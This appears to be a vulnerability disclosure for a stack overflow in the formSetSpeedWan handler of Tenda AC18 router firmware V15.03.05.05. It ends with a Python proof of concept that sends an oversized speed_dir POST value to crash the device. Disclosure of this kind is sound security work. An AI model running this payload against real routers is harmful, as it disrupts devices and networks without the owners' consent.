## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetSpeedWan` function. The `v7` variable receives the `speed_dir` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided  `v7` can trigger this security vulnerability.

![image-20240305231334076](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231334076.png)

![image-20240305231341818](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231341818.png)

![image-20240305231353586](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231353586.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSpeedWan"
payload = b"a"*1000


data = {"speed_dir": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305231235284](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231235284.png)
